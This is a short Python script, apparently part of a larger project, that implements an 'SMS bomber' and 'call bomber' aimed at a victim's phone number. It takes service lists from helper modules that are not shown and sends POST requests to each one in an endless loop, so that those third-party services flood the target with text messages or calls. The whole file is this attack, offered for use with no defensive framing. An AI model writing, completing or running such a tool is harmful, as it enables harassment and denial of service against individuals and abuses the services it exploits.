from utils import send_post_request
from services import get_call_service, get_sms_service

import time

def send_requests(services, request_type):
    while True:
        for service_name, service_info in services.items():
            if service_info['json']:
                send_post_request(url=service_info['url'], data=service_info['data'], json=True)
            else:
                send_post_request(url=service_info['url'], data=service_info['data'])

            print(f'Sent {request_type}, service: {service_name}')
            if request_type == 'call':
                time.sleep(20)

def start_call_bomber(phone):
    services = get_call_service(phone)
    send_requests(services, 'call')

def start_sms_bomber(phone):
    services = get_sms_service(phone)
    send_requests(services, 'SMS')
